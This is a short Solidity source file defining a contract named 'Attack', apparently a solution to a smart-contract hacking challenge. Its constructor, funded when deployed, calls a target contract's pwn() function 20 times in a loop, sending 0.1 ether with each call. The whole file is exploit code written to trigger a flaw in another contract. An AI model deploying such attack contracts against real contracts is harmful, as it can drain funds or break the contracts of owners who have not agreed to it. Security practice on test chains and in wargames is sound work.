pragma solidity ^0.8.0;

 contract Attack {
    constructor (address _target) payable{
        for(uint i=0; i < 20; i++){
(bool status, bytes memory data) = (_target).call{value: 0.1 ether}(abi.encodeWithSignature("pwn()"));
        }
    }
 }